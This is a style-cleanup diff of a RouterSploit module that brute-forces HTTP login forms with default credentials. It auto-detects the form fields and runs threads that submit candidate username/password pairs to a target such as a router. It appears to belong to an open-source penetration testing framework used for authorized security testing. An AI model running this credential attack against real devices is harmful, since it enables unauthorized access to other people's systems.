@@ -2,7 +2,16 @@ import threading
 import requests
 from bs4 import BeautifulSoup
 
-from routersploit import *
+from routersploit import (
+    exploits,
+    wordlists,
+    print_status,
+    print_error,
+    LockedIterator,
+    print_success,
+    print_table,
+    sanitize_url,
+)
 
 
 class Exploit(exploits.Exploit):
@@ -13,8 +22,8 @@ class Exploit(exploits.Exploit):
     __info__ = {
         'name': 'HTTP Form Default Creds',
         'author': [
-            'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
-         ]
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
+        ]
     }
 
     target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
@@ -35,7 +44,7 @@ class Exploit(exploits.Exploit):
         url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
 
         try:
-            r = requests.get(url)
+            requests.get(url)
         except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
             print_error("Invalid URL format: %s" % url)
             return
@@ -43,11 +52,11 @@ class Exploit(exploits.Exploit):
             print_error("Connection error: %s" % url)
             return
 
-        # authentication type 
+        # authentication type
         if self.form == 'auto':
             self.data = self.detect_form()
 
-            if self.data == None:
+            if self.data is None:
                 print_error("Could not detect form")
                 return
         else:
@@ -98,10 +107,10 @@ class Exploit(exploits.Exploit):
         url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
         r = requests.get(url)
         soup = BeautifulSoup(r.text, "lxml")
-        
+
         form = soup.find("form")
 
-        if form == None:
+        if form is None:
             return None
 
         if len(form) > 0:
@@ -109,21 +118,21 @@ class Exploit(exploits.Exploit):
             for inp in form.findAll("input"):
                 if 'name' in inp.attrs.keys():
                     if inp.attrs['name'].lower() in ["username", "user", "login"]:
-                        res.append(inp.attrs['name']+"="+"{{USER}}")
+                        res.append(inp.attrs['name'] + "=" + "{{USER}}")
                     elif inp.attrs['name'].lower() in ["password", "pass"]:
-                        res.append(inp.attrs['name']+"="+"{{PASS}}")
+                        res.append(inp.attrs['name'] + "=" + "{{PASS}}")
                     else:
                         if 'value' in inp.attrs.keys():
-                            res.append(inp.attrs['name']+"="+inp.attrs['value'])
+                            res.append(inp.attrs['name'] + "=" + inp.attrs['value'])
                         else:
-                            res.append(inp.attrs['name']+"=")
+                            res.append(inp.attrs['name'] + "=")
         return '&'.join(res)
 
     def target_function(self, running, data):
         name = threading.current_thread().name
         url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
         headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
-        
+
         print_status(name, 'process is starting...')
 
         while running.is_set():
@@ -146,4 +155,3 @@ class Exploit(exploits.Exploit):
                 break
 
         print_status(name, 'process is terminated.')
-
